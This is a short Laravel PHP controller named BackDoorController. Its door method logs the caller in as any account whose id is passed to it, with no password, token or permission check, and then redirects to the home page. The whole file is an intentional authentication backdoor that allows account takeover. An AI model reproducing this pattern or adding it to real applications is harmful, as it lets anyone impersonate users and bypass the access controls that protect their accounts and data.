<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller as Controller;
use Illuminate\Http\Request;

class BackDoorController extends Controller
{
    public function door($accountId)
    {
        $accountSn = \DB::table('account')->where('accountId', $accountId)->value('accountSn');
        \Auth::loginUsingId($accountSn);

        return redirect('/');
    }
}
